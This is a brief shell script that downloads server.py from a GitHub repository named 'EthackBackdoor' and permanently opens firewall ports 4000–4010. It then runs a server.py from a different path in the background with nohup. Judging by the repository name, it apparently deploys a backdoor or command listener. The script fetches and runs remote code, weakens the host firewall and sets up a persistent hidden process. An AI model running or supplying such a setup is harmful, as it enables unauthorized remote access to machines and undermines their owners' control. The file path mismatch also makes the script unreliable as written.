curl -LJO https://raw.githubusercontent.com/VineelGajjala/EthackBackdoor/main/server.py
firewall-cmd --zone=public --permanent --add-port=4000/tcp
firewall-cmd --zone=public --permanent --add-port=4001/tcp
firewall-cmd --zone=public --permanent --add-port=4002/tcp
firewall-cmd --zone=public --permanent --add-port=4003/tcp
firewall-cmd --zone=public --permanent --add-port=4004/tcp
firewall-cmd --zone=public --permanent --add-port=4005/tcp
firewall-cmd --zone=public --permanent --add-port=4006/tcp
firewall-cmd --zone=public --permanent --add-port=4007/tcp
firewall-cmd --zone=public --permanent --add-port=4008/tcp
firewall-cmd --zone=public --permanent --add-port=4009/tcp
firewall-cmd --zone=public --permanent --add-port=4010/tcp
nohup ~/home/server.py &
